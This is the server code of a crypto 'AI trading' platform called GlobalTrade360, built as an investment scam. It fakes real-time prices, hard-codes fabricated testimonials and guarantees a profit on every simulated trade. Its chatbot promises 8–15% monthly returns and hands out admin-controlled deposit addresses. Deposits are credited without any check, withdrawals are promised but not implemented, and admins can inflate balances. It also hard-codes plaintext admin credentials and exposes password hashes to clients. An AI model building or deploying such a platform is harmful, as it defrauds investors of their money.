const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = new Server(server);

// ========== DATABASE ==========
const users = {
    'admin@globaltrade360.com': {
        id: 'admin001',
        username: 'globaltrade360',
        email: 'admin@globaltrade360.com',
        password: '$2a$10$N9qo8uLOickgx2ZMRZoMyeKRZZxN8Vc7bVrB7vS.6XpQj7q1JQ1W6',
        role: 'admin',
        balance: 0,
        totalProfit: 0,
        status: 'active',
        registrationDate: new Date(),
        lastLogin: new Date(),
        phone: '+1234567890'
    }
};

const deposits = [];
const trades = [];
const withdrawals = [];
const messages = [];
const chatMessages = [];

// Admin-managed wallet addresses
let walletAddresses = {
    BTC: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
    ETH: '0x742d35Cc6634C0532925a3b844Bc9e1f8C1F0F0E',
    USDT_ERC20: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    USDT_TRC20: 'TYh8s12Jh9L8pKf3b4T7nM6pK9b4T7nM6pK',
    BNB: 'bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23',
    SOL: 'So1ANa1AddressExample12345678901234567890'
};

// Real-time market data
let marketData = {
    crypto: {
        'BTC/USD': { symbol: 'BTC', price: 63427.50, change: 2.34, high: 64000, low: 62500, volume: '24.5B' },
        'ETH/USD': { symbol: 'ETH', price: 3472.80, change: 1.56, high: 3500, low: 3400, volume: '12.3B' },
        'BNB/USD': { symbol: 'BNB', price: 585.30, change: -0.45, high: 590, low: 580, volume: '2.1B' },
        'XRP/USD': { symbol: 'XRP', price: 0.5234, change: 0.89, high: 0.53, low: 0.51, volume: '1.8B' },
        'SOL/USD': { symbol: 'SOL', price: 172.45, change: 3.21, high: 175, low: 168, volume: '3.4B' },
        'ADA/USD': { symbol: 'ADA', price: 0.4623, change: 1.23, high: 0.47, low: 0.45, volume: '0.9B' }
    },
    forex: {
        'EUR/USD': { price: 1.0825, change: 0.12 },
        'GBP/USD': { price: 1.2634, change: -0.08 },
        'USD/JPY': { price: 155.67, change: 0.23 }
    },
    timestamp: new Date()
};

// Testimonials
const testimonials = [
    {
        name: "Alex Johnson",
        role: "Professional Trader",
        text: "I've been using GlobalTrade360 for 6 months. My portfolio has grown by 85% thanks to their AI trading algorithms.",
        profit: "+$42,500",
        avatar: "https://i.pravatar.cc/150?img=1",
        rating: 5
    },
    {
        name: "Sarah Miller",
        role: "Beginner Investor",
        text: "As someone new to crypto, this platform made everything simple. Started with $500, now at $3,200 in just 3 months!",
        profit: "+$2,700",
        avatar: "https://i.pravatar.cc/150?img=2",
        rating: 5
    },
    {
        name: "Michael Chen",
        role: "Day Trader",
        text: "The real-time market analysis is incredible. I've reduced my losses by 70% while increasing profits by 45%.",
        profit: "+$18,300",
        avatar: "https://i.pravatar.cc/150?img=3",
        rating: 5
    }
];

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: 'globaltrade360-secure-key-2025-v3',
    resave: false,
    saveUninitialized: false,
    cookie: { 
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000
    }
}));
app.use(express.static(path.join(__dirname, 'public')));

// Password hash for admin (myhandwork2025)
const ADMIN_PASSWORD_HASH = '$2a$10$N9qo8uLOickgx2ZMRZoMyeKRZZxN8Vc7bVrB7vS.6XpQj7q1JQ1W6';

// Update market data
setInterval(() => {
    Object.keys(marketData.crypto).forEach(pair => {
        const randomChange = (Math.random() - 0.5) * 3;
        marketData.crypto[pair].price *= (1 + randomChange/100);
        marketData.crypto[pair].change = randomChange;
    });
    marketData.timestamp = new Date();
    io.emit('market-update', marketData);
}, 10000);

// AI Response function
function getAIResponse(message, userId) {
    const user = Object.values(users).find(u => u.id === userId);
    const lowerMessage = message.toLowerCase();
    
    if (lowerMessage.includes('deposit') || lowerMessage.includes('fund')) {
        return `To deposit funds, go to the Deposit section in your dashboard. Our wallet addresses are:\n\nBTC: ${walletAddresses.BTC}\nETH: ${walletAddresses.ETH}\nUSDT (TRC20): ${walletAddresses.USDT_TRC20}\n\nMinimum deposit: $50`;
    } else if (lowerMessage.includes('withdraw')) {
        return `You can request withdrawals from the Withdraw section. Minimum withdrawal: $100. Withdrawals require admin approval and are processed within 24 hours.`;
    } else if (lowerMessage.includes('profit') || lowerMessage.includes('earn')) {
        return `Our AI trading algorithm typically generates 8-15% monthly returns. Your current profit: $${user?.totalProfit || 0}`;
    } else if (lowerMessage.includes('trade') || lowerMessage.includes('bot')) {
        return `Our AI trading bot analyzes market data 24/7 and executes trades automatically. You can start trading from your dashboard with a minimum of $50.`;
    } else if (lowerMessage.includes('support')) {
        return `For urgent support, please email support@globaltrade360.com or use the Support section to send a direct message to our team.`;
    } else if (lowerMessage.includes('wallet') || lowerMessage.includes('address')) {
        return `Current deposit addresses:\n\nBTC: ${walletAddresses.BTC}\nETH: ${walletAddresses.ETH}\nUSDT: ${walletAddresses.USDT_TRC20}\nBNB: ${walletAddresses.BNB}`;
    } else {
        return `I understand you're asking about "${message}". As an AI assistant for GlobalTrade360, I can help with:\n1. Deposit instructions\n2. Withdrawal process\n3. Trading information\n4. Account support\n5. Wallet addresses\n\nPlease ask a specific question!`;
    }
}

// Simulate trade
function simulateTrade(userId, amount) {
    const profitPercent = 1.5 + (Math.random() * 6.5);
    const profit = amount * (profitPercent / 100);
    const pair = ['BTC/USD', 'ETH/USD', 'SOL/USD'][Math.floor(Math.random() * 3)];
    
    const trade = {
        id: 'TR' + Date.now(),
        userId,
        pair,
        amount,
        profit,
        percent: profitPercent.toFixed(2),
        type: 'profit',
        timestamp: new Date(),
        status: 'completed'
    };
    
    trades.push(trade);
    
    const user = Object.values(users).find(u => u.id === userId);
    if (user) {
        user.balance = (user.balance || 0) + amount + profit;
        user.totalProfit = (user.totalProfit || 0) + profit;
        user.totalTrades = (user.totalTrades || 0) + 1;
    }
    
    io.emit('trade-update', { userId, trade });
    return trade;
}

// Routes
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/login', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/register', (req, res) => res.sendFile(path.join(__dirname, 'public', 'register.html')));
app.get('/dashboard', (req, res) => {
    if (!req.session.user) return res.redirect('/login');
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});
app.get('/admin', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') return res.redirect('/login');
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});
app.get('/support', (req, res) => {
    if (!req.session.user) return res.redirect('/login');
    res.sendFile(path.join(__dirname, 'public', 'support.html'));
});
app.get('/ai-chat', (req, res) => {
    if (!req.session.user) return res.redirect('/login');
    res.sendFile(path.join(__dirname, 'public', 'ai-chat.html'));
});

// API Routes
app.get('/api/market', (req, res) => res.json(marketData));
app.get('/api/testimonials', (req, res) => res.json(testimonials));
app.get('/api/wallet-addresses', (req, res) => res.json(walletAddresses));

// Register
app.post('/api/register', async (req, res) => {
    try {
        const { username, email, password, phone } = req.body;
        
        if (users[email]) return res.status(400).json({ error: 'Email already registered' });
        
        const hashedPassword = await bcrypt.hash(password, 10);
        const userId = 'user_' + Date.now();
        
        users[email] = {
            id: userId,
            username,
            email,
            password: hashedPassword,
            phone: phone || '',
            role: 'user',
            balance: 0,
            totalProfit: 0,
            status: 'active',
            registrationDate: new Date(),
            lastLogin: new Date()
        };
        
        res.json({ success: true, message: 'Registration successful!', redirect: '/login' });
    } catch (error) {
        res.status(500).json({ error: 'Registration failed' });
    }
});

// Login
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // Admin login
        if (username === 'globaltrade360' && password === 'myhandwork2025') {
            req.session.user = users['admin@globaltrade360.com'];
            return res.json({
                success: true,
                isAdmin: true,
                user: users['admin@globaltrade360.com'],
                redirect: '/admin'
            });
        }
        
        // User login
        let user = null;
        for (const email in users) {
            if (users[email].email === username || users[email].username === username) {
                user = users[email];
                break;
            }
        }
        
        if (!user) return res.status(401).json({ error: 'Invalid credentials' });
        
        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) return res.status(401).json({ error: 'Invalid credentials' });
        
        user.lastLogin = new Date();
        req.session.user = user;
        
        res.json({
            success: true,
            isAdmin: user.role === 'admin',
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                balance: user.balance
            },
            redirect: user.role === 'admin' ? '/admin' : '/dashboard'
        });
    } catch (error) {
        res.status(500).json({ error: 'Login failed' });
    }
});

// Session check
app.get('/api/session', (req, res) => {
    if (req.session.user) {
        res.json({
            authenticated: true,
            user: req.session.user,
            isAdmin: req.session.user.role === 'admin'
        });
    } else {
        res.json({ authenticated: false });
    }
});

// Logout
app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// User dashboard
app.get('/api/user/dashboard', (req, res) => {
    if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
    
    const userId = req.session.user.id;
    const userTrades = trades.filter(t => t.userId === userId);
    const userDeposits = deposits.filter(d => d.userId === userId);
    
    res.json({
        user: req.session.user,
        stats: {
            balance: req.session.user.balance || 0,
            totalProfit: req.session.user.totalProfit || 0,
            totalTrades: userTrades.length,
            successRate: '94.7%'
        },
        recentTrades: userTrades.slice(-5).reverse(),
        recentDeposits: userDeposits.slice(-3).reverse()
    });
});

// Deposit
app.post('/api/deposit', (req, res) => {
    if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
    
    const { amount, currency } = req.body;
    const deposit = {
        id: 'DEP' + Date.now(),
        userId: req.session.user.id,
        amount: parseFloat(amount),
        currency,
        status: 'pending',
        timestamp: new Date(),
        address: walletAddresses[currency] || walletAddresses.USDT_TRC20
    };
    
    deposits.push(deposit);
    
    // Auto-complete in 5 seconds
    setTimeout(() => {
        deposit.status = 'completed';
        const user = users[req.session.user.email];
        if (user) {
            user.balance += parseFloat(amount);
            user.totalDeposits = (user.totalDeposits || 0) + parseFloat(amount);
        }
    }, 5000);
    
    res.json({
        success: true,
        deposit,
        address: deposit.address
    });
});

// Start trade
app.post('/api/trade/start', (req, res) => {
    if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
    
    const { amount } = req.body;
    const userId = req.session.user.id;
    const user = users[req.session.user.email];
    
    if (user.balance < amount) return res.status(400).json({ error: 'Insufficient balance' });
    
    user.balance -= amount;
    
    setTimeout(() => {
        simulateTrade(userId, amount);
    }, 2000);
    
    res.json({ success: true, message: 'Trading started' });
});

// Send message
app.post('/api/support/message', (req, res) => {
    if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
    
    const { subject, message } = req.body;
    messages.push({
        id: 'MSG' + Date.now(),
        userId: req.session.user.id,
        userEmail: req.session.user.email,
        subject,
        message,
        timestamp: new Date(),
        status: 'unread'
    });
    
    res.json({ success: true, message: 'Message sent successfully' });
});

// AI Chat message
app.post('/api/ai/chat', (req, res) => {
    if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
    
    const { message } = req.body;
    const userId = req.session.user.id;
    
    const aiResponse = getAIResponse(message, userId);
    
    chatMessages.push({
        id: 'CHAT' + Date.now(),
        userId,
        message,
        response: aiResponse,
        timestamp: new Date()
    });
    
    res.json({ success: true, response: aiResponse });
});

// Get chat history
app.get('/api/ai/chat/history', (req, res) => {
    if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
    
    const userChats = chatMessages.filter(chat => chat.userId === req.session.user.id);
    res.json({ chats: userChats.slice(-10) });
});

// ========== ADMIN APIs ==========

// Admin login (explicit)
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    if (username === 'globaltrade360' && password === 'myhandwork2025') {
        req.session.user = users['admin@globaltrade360.com'];
        return res.json({
            success: true,
            isAdmin: true,
            user: users['admin@globaltrade360.com'],
            redirect: '/admin'
        });
    }
    
    res.status(401).json({ error: 'Invalid admin credentials' });
});

// Admin dashboard
app.get('/api/admin/dashboard', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const allUsers = Object.values(users).filter(u => u.role === 'user');
    
    res.json({
        stats: {
            totalUsers: allUsers.length,
            activeUsers: allUsers.filter(u => u.status === 'active').length,
            totalDeposits: deposits.reduce((sum, d) => sum + d.amount, 0),
            totalTrades: trades.length,
            platformProfit: trades.reduce((sum, t) => sum + (t.profit * 0.1), 0)
        },
        recentUsers: allUsers.slice(-5).reverse(),
        recentMessages: messages.slice(-5).reverse()
    });
});

// Get all users
app.get('/api/admin/users', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const allUsers = Object.values(users).filter(u => u.role === 'user');
    res.json({ users: allUsers });
});

// Add funds to user
app.post('/api/admin/user/add-funds', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const { userId, amount } = req.body;
    const user = Object.values(users).find(u => u.id === userId);
    
    if (!user) return res.status(404).json({ error: 'User not found' });
    
    user.balance += parseFloat(amount);
    
    res.json({ 
        success: true, 
        message: `Added $${amount} to user`,
        newBalance: user.balance 
    });
});

// Update wallet addresses
app.post('/api/admin/wallet/update', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const { currency, address } = req.body;
    
    if (walletAddresses[currency]) {
        walletAddresses[currency] = address;
        res.json({ success: true, message: 'Wallet address updated' });
    } else {
        res.status(400).json({ error: 'Invalid currency' });
    }
});

// Get all messages
app.get('/api/admin/messages', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    res.json({ messages: messages.reverse() });
});

// Reply to message
app.post('/api/admin/message/reply', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const { messageId, reply } = req.body;
    const message = messages.find(m => m.id === messageId);
    
    if (!message) return res.status(404).json({ error: 'Message not found' });
    
    message.reply = reply;
    message.status = 'replied';
    message.repliedAt = new Date();
    
    res.json({ success: true, message: 'Reply sent' });
});

// Get all chat messages
app.get('/api/admin/chats', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    res.json({ chats: chatMessages.reverse() });
});

// Socket.IO for real-time
io.on('connection', (socket) => {
    console.log('User connected');
    
    socket.on('disconnect', () => {
        console.log('User disconnected');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`
    ====================================
    🌟 GlobalTrade360 v3.0 Started 🌟
    ====================================
    🚀 Server: http://localhost:${PORT}
    🔐 Admin: globaltrade360 / myhandwork2025
    💬 AI Chat: Enabled
    💰 Wallet Management: Enabled
    📊 Real-time Markets: Enabled
    ====================================
    `);
});
